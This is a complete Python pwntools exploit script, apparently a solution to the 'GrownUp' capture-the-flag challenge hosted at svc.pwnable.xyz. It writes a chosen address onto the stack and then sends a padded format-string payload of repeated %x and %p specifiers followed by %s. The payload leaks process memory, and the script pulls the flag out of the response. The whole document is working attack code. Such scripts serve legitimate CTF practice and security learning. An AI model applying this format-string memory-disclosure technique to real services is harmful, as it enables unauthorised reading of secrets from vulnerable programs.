#!/usr/bin/env python3
from pwn import *
import sys, pwnlib, struct

pwnlib.args.SILENT(True)
BINPATH = './GrownUpRedist'
HOST = 'svc.pwnable.xyz'
PORT = 30004

def main(argc, argv):
    modes = ['local', 'remote']
    if(argc < 2):
        return 0
    mode = argv[1].lower()
    if(mode not in modes):
        return 0

    p = process(BINPATH) if mode == modes[0] else remote(HOST, PORT)
    death = p.kill if mode == modes[0] else p.close

    p.recvuntil(b": ")
    p.send(b'y\x00\x00\x00\x00\x00\x00\x00'+struct.pack("<Q", 0x00601080))
    p.recvuntil(b': ')
    fmt = b'%x'*16+b"%p"*8+b"%s"
    p.send(fmt+b"A"*((128-len(fmt))))
    r = p.recv()
    flag = r[r.index(b'FLAG'):].split(b'AA')[0]
    print(flag.decode())

    death()
    return 0

if(__name__=='__main__'):
    try:
        exit(main(len(sys.argv), sys.argv))
    except KeyboardInterrupt:
        exit(130)